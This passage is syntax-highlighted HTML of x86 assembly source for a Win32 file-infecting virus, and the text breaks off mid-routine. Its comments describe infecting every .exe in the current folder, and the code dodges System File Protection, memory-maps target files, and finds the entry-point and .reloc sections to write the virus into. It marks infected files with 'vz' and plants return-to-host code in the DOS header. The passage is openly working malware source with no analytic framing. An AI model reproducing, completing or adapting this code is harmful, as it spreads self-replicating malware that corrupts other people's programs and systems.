                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">paytit</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">07h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MessageBoxAz</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">FirstFile</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;infect all .exe in his folder that could infect</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">files</span><span class="sc4">]</span><span class="sc0">        
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FindFirstFileAz</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">retHost</span><span class="sc0"> 
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">handFile</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infection</span><span class="sc0">
</span><span class="sc5">NextFile</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_dwFileAttributes</span><span class="sc4">]</span><span class="sc0">        
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">         
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SetFileAttributesAz</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">handFile</span><span class="sc4">]</span><span class="sc0">        
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FindNextFileAz</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">retHost</span><span class="sc0"> 
</span><span class="sc5">infection</span><span class="sc4">:</span><span class="sc0">  
        
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetVersionz</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">08000000h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">_9x</span><span class="sc0">      
</span><span class="sc5">NT</span><span class="sc4">:</span><span class="sc0">
     
                </span><span class="sc1">;in NT only infect if have permiss</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WFD_dwFileAttributes</span><span class="sc4">]</span><span class="sc0">     
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1915h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NextFile</span><span class="sc0">
            
</span><span class="sc5">_9x</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;sfp?? i test it for NT and 9x becoz i have listened</span><span class="sc0">
                    </span><span class="sc1">;millenium have it too,true?</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                               
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SfcIsFileProtectedz</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">nosfc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NextFile</span><span class="sc0">
</span><span class="sc5">nosfc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;next part is tipycal file mapping</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">                    
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                    
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SetFileAttributesAz</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0C0000000h</span><span class="sc0">  
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CreateFileAz</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Closed</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CreateFileHand</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CreateFileMappingAz</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">CloseFile</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CreateFileMappingHand</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">000F001Fh</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MapViewOfFilez</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">CloseMapping</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MapViewOfFileHand</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0"> </span><span class="sc1">;test if PE file    </span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">CloseView</span><span class="sc0">               
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">     
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">CloseView</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">CloseView</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;not infected yet??</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'vz'</span><span class="sc0">             
                </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">CloseView</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">
                
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">      
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0"> 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        
</span><span class="sc5">BuscaEntrySec</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">   
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;search for entryPoint section,</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">;the section where is entryPoint.</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">EntrySection</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">BuscaEntrySec</span><span class="sc0">                   

</span><span class="sc5">EntrySection</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0"> 
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;offset of Epoint in file.No RVA.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0"> 
                </span><span class="sc1">;AddressOfEntryPoint - VAsection + PointerToRawData</span><span class="sc0">
                
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EntryPointInFile</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">     

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;SectionEnd - entryPoint</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">sizeVir</span><span class="sc0"> 
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">               
                </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">nxt</span><span class="sc0">                   </span><span class="sc1">;enought size for put virus?</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">nonxt</span><span class="sc0">                 

</span><span class="sc5">nxt</span><span class="sc4">:</span><span class="sc0">                
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CloseView</span><span class="sc0">       

</span><span class="sc5">nonxt</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">         
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0"> 
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">     
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">buscaReloc</span><span class="sc4">:</span><span class="sc0">
            
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">            </span><span class="sc1">;searching for reloc</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                
                </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">nxt2</span><span class="sc0">                   
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">nonxt2</span><span class="sc0">              
        
</span><span class="sc5">nxt2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">;no .reloc</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CloseView</span><span class="sc0">
</span><span class="sc5">nonxt2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">       </span><span class="sc1">;is this section .reloc?? compare...</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reloc</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">compara</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">buscaReloc</span><span class="sc0">
                
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">  
                </span><span class="sc1">;enought space in reloc for virus? </span><span class="sc0">
                                
                </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">CloseView</span><span class="sc0">
                        
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;reloc dir for nxt gen</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;go start .reloc</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">;copy return to host code to imagebase + 26h,overwriting oeminfo and next 5 reverved word.</span><span class="sc0">
</span><span class="sc1">;returnHost is 22 bytes, word oeminfo + 5 * dword reserveds ;)</span><span class="sc0">

</span><span class="sc5">CopyToReserved</span><span class="sc4">:</span><span class="sc0">         
                            
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ReturnHost</span><span class="sc4">]</span><span class="sc0">       
                </span><span class="sc5">tamReturn</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">ReturnHost_</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ReturnHost</span><span class="sc0">                
